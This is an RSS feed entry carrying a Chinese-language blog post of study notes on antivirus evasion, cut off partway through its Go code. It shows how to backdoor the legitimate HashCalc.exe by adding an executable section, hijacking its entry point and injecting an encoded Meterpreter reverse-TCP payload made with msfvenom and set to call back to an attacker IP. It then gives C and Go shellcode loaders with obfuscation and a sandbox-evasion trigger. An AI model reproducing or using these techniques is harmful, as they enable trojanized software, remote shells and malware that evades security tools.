<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>免杀 on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/series/%E5%85%8D%E6%9D%80/</link><description>Recent content in 免杀 on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 26 Apr 2022 23:42:54 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/series/%E5%85%8D%E6%9D%80/index.xml" rel="self" type="application/rss+xml"/><item><title>免杀学习笔记Ⅰ</title><link>https://amiaaaz.github.io/2022/04/26/bypass-av-study-notes-01/</link><pubDate>Tue, 26 Apr 2022 23:42:54 +0800</pubDate><guid>https://amiaaaz.github.io/2022/04/26/bypass-av-study-notes-01/</guid><description>&lt;h2 id="shellcode注入">shellcode注入&lt;/h2>
&lt;p>&lt;a href="https://github.com/NetSPI/PESecurity">PESecurity&lt;/a>可以检测目标对象是否开启ASLR等安全选项&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Import-Module&lt;/span> &lt;span style="color:#111">.\&lt;/span>&lt;span style="color:#111">Get-PESecurity&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">psm1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Get-PESecurity&lt;/span> &lt;span style="color:#f92672">-file&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#111">signle&lt;/span> &lt;span style="color:#111">file&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Get-PESecurity&lt;/span> &lt;span style="color:#111">-directory&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#111">directory&lt;/span> &lt;span style="color:#111">path&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">DLLs&lt;/span> &lt;span style="color:#111">&amp;amp;&lt;/span> &lt;span style="color:#111">EXEs&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407150555253.png" alt="image-20220407150555253">&lt;/p>
&lt;p>选择目标对象的标准：&lt;/p>
&lt;ul>
&lt;li>大小&amp;lt;10mb，利于传输&lt;/li>
&lt;li>本身为大众文件，便于隐蔽&lt;/li>
&lt;li>不受ASLR或DEP等安全功能的保护&lt;/li>
&lt;li>最好本身有使用网络通信的合法功能&lt;/li>
&lt;/ul>
&lt;p>这里选择的是HashCalc.exe&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407152820447.png" alt="image-20220407152820447">&lt;/p>
&lt;ol>
&lt;li>首先在在代码区段中创建新的节头，或在内存中找到合适的位置植入我们的shellcode&lt;/li>
&lt;/ol>
&lt;p>用&lt;a href="https://down.52pojie.cn/Tools/PEtools/LordPE.7z">Lord PE&lt;/a>打开目标程序，并在区段表底部添加新段.ame，并将VSize和RSize都增加0x1000（4096字节），并设置可读可写可执行&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407153429603.png" alt="image-20220407153429603">&lt;/p>
&lt;p>此时直接运行会失败，因为我们添加了一个1000h字节的新段，但是该区段为空&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407153503852.png" alt="image-20220407153503852">&lt;/p>
&lt;p>先简单填充1000个0x00看程序是否正常运行，这里用的是&lt;a href="https://mh-nexus.de/downloads/HxDSetup.zip">HxD&lt;/a>（注意要填充到文件末尾）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407154451061.png" alt="image-20220407154451061">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407155458815.png" alt="image-20220407155458815">&lt;/p>
&lt;p>可以正常运行&lt;/p>
&lt;ol start="2">
&lt;li>劫持程序执行流程&lt;/li>
&lt;/ol>
&lt;p>首先在&lt;a href="https://down.52pojie.cn/Tools/Debuggers/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E4%B8%93%E7%94%A8%E7%89%88Ollydbg.rar">Ollydbg&lt;/a>中转到内存部分（alt+M），可以看到我们新加的.ame，并且有RWE权限&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407160456405.png" alt="image-20220407160456405">&lt;/p>
&lt;p>接下来我们要将程序的执行流劫持到我们新添加的.ame段中，使最终执行程序时进入放有shellcode的.ame部分&lt;/p>
&lt;p>首先复制前3个操作码（之后回复执行流程时需要）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407164119652.png" alt="image-20220407164119652">&lt;/p>
&lt;p>我们复制.ame的起始地址00482000，并把程序入口处的&lt;code>push ebp&lt;/code>改为&lt;code>jmp 00482000&lt;/code>并保存为新的exe&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407165720185.png" alt="image-20220407165720185">&lt;/p>
&lt;p>再次运行时就已经不会展示正常的页面了&lt;/p>
&lt;ol start="3">
&lt;li>填充msf🐎&lt;/li>
&lt;/ol>
&lt;p>这里用messagebox做填充&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>msfvenom -p windows/messagebox &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;it&amp;#39;s demo&amp;#34;&lt;/span> -f hex
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在&lt;code>jmp 00482000&lt;/code>处enter跟随跳转，把payload复制到null的部分，保存为新的exe&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407170518230.png" alt="image-20220407170518230">&lt;/p>
&lt;p>成功运行&lt;/p>
&lt;ol start="4">
&lt;li>回复程序的正常执行流程&lt;/li>
&lt;/ol>
&lt;p>首先将shellcode最后一句跳转改为nop，使用&lt;code>popfd&lt;/code>和&lt;code>popod&lt;/code>回复堆栈操作，然后将原程序起始位置的汇编码复制到这里，最后跳转回原来的执行地址&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407180451897.png" alt="image-20220407180451897">&lt;/p>
&lt;p>就可以在弹messagebox之后继续HashCalc原程序了&lt;/p>
&lt;p>同理，我们可以插入msf🐎&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i &lt;span style="color:#ae81ff">4&lt;/span> -b &lt;span style="color:#d88200">&amp;#39;\x00&amp;#39;&lt;/span> &lt;span style="color:#111">lhost&lt;/span>&lt;span style="color:#f92672">=&lt;/span>192.168.31.29 &lt;span style="color:#111">lport&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">4788&lt;/span> -f hex
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意此处选用&lt;code>x86/shikata_ga_nai&lt;/code>的encoder之后前面就不能用x64了，默认生成的都是x86的payload，并且要注意&lt;code>-i&lt;/code>参数的指定，要与前面扩充的新段大小相匹配&lt;/p>
&lt;h2 id="shellcode加载器">shellcode加载器&lt;/h2>
&lt;blockquote>
&lt;/blockquote>
&lt;p>根据前面对🐎结构的分析，我们知道单一的shellcode是无法执行的，需要配套的shellcode loader来接收后续的stager，编写的思路都是大差不差的，以动态加载内存为例：&lt;/p>
&lt;ol>
&lt;li>接收4字节缓冲区大小&lt;/li>
&lt;li>开辟内存&lt;/li>
&lt;li>将socket中的值复制到缓冲区中去&lt;/li>
&lt;li>读取字节到缓冲区&lt;/li>
&lt;li>执行syscall&lt;/li>
&lt;li>退出&lt;/li>
&lt;/ol>
&lt;p>这是最最最基础的loader，当考虑到免杀时，我们可以尝试使用不同的语言来编译exe（比如python, go等）、消除代码中的明显特征，或是为接收payload这一行为前加上沙盒中无法实现的条件来bypass&lt;/p>
&lt;p>下面以c的版本做主要的示例：）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 亲测这个encoder完全不能用到windows/x64/xxx上 之后编译exe也得用`gcc -m32 x.c -o x.exe` 必须配套32位&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 这样产生的shellcode本体可以做到基本免杀 后续的操作基于如何免杀加载&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i &lt;span style="color:#ae81ff">4&lt;/span> -b &lt;span style="color:#d88200">&amp;#39;\x00&amp;#39;&lt;/span> &lt;span style="color:#111">lhost&lt;/span>&lt;span style="color:#f92672">=&lt;/span>192.168.31.29 &lt;span style="color:#111">lport&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">4788&lt;/span> -f c -o t1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="c">C&lt;/h3>
&lt;h4 id="不考虑loader的裸执行必被杀">不考虑loader的裸执行（必被杀&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;windows.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">[]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">)();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="申请动态内存加载">申请动态内存加载&lt;/h4>
&lt;p>通常会调用kernel32的win api，常见函数和它们的作用（以c为例）&lt;/p>
&lt;pre tabindex="0">&lt;code>malloc: 分配内存
VirtualAlloc: 申请一块可读可写可执行的动态内存区域
memcpy: 从指定内存中复制内容至另一内存里
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LPVOID&lt;/span> &lt;span style="color:#111">Memory&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Memory&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">VirtualAlloc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">NULL&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">sizeof&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">MEM_COMMIT&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#111">MEM_RESERVE&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">PAGE_EXECUTE_READWRITE&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 内存地址, 大小, 分配类型, 该内存的初始保护属性
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">memcpy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Memory&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">sizeof&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">)())&lt;/span>&lt;span style="color:#111">Memory&lt;/span>&lt;span style="color:#111">)();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="内联汇编指令">内联汇编指令&lt;/h4>
&lt;p>*注意gcc的内联汇编与vc的不同 使用AT&amp;amp;T语法，请参照&lt;a href="https://www.jianshu.com/p/1782e14a0766">GCC内联汇编基础&lt;/a>&lt;/p>
&lt;h3 id="go">Go&lt;/h3>
&lt;p>通过&lt;code>syscall&lt;/code>可以丝滑地调用kernel32.dll的函数&lt;/p>
&lt;h4 id="条件触发">条件触发&lt;/h4>
&lt;p>首先对shellcode进行简易混淆&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># https://github.com/pureqh/bypassAV/blob/main/go_shellcode_encode.py&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">buf1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;shellcode&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">b64shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">buf1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">b64shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">b64shellcode&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;#&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;H&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;@&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;T&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;)&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">b64shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里条件触发，指的是在最后指令执行前 先访问一次局域网内存在而沙箱内不存在的文件，达到bypass沙箱的效果&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// https://github.com/pureqh/bypassAV/blob/main/main.go
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;encoding/base64&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/url&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;strings&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;syscall&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;unsafe&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">kernel32&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">syscall&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewLazyDLL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;kernel32.dll&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">VirtualAlloc&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">kernel32&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewProc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;VirtualAlloc&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">RtlMoveMemory&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">kernel32&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewProc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;RtlMoveMemory&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ddm&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">str1&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ddm&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">str2&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;H&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">str3&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;@&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">str4&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str3&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;)&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;T&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">sDec&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">base64&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">StdEncoding&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">DecodeString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str4&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">addr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">VirtualAlloc&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Call&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uintptr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sDec&lt;/span>&lt;span style="color:#111">)),&lt;/span> &lt;span style="color:#ae81ff">0x1000&lt;/span>&lt;span style="color:#111">|&lt;/span>&lt;span style="color:#ae81ff">0x2000&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0x40&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">RtlMoveMemory&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Call&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">addr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">uintptr&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#75af00">unsafe&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Pointer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#75af00">sDec&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">])),&lt;/span> &lt;span style="color:#111">uintptr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sDec&lt;/span>&lt;span style="color:#111">)))&lt;/span>
